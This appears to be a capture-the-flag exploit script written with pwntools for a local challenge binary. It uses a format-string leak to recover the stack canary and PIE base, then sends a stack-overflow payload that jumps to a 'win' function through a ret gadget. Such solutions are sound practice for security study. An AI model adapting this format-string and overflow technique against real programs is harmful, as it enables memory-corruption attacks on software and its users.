from pwn import *

exe = "./pwn"
elf = context.binary = ELF(exe)
#context.log_level = 'debug'

p = process(exe)

p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b"> ")

# --- LEAK ---
p.sendline(b"%15$p %17$p")
p.recvuntil(b"verdin:\n")

leaks = p.recvline().split()
canary = int(leaks[0], 16)
leak_addr = int(leaks[1], 16)

log.success(f"Canary: {hex(canary)}")
log.success(f"Leaked Addr: {hex(leak_addr)}")

# --- PIE CALCULATION ---
offset = 0x14a5 
elf.address = leak_addr - offset
log.success(f"PIE Base: {hex(elf.address)}")

win_addr = elf.symbols['win']
log.info(f"Win Function: {hex(win_addr)}")

# --- FIND RET GADGET ---
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Ret Gadget: {hex(ret_gadget)}")

# --- PAYLOAD ---
padding = 40

payload = b'A' * padding
payload += p64(canary)
payload += b'B' * 8          # Overwrite Saved RBP
payload += p64(ret_gadget)   # Fix Stack Alignment
payload += p64(win_addr)     # ret2win

p.recvuntil(b"> ")
p.sendline(b"3")
p.recvuntil(b"> ")
p.sendline(payload)

p.interactive()
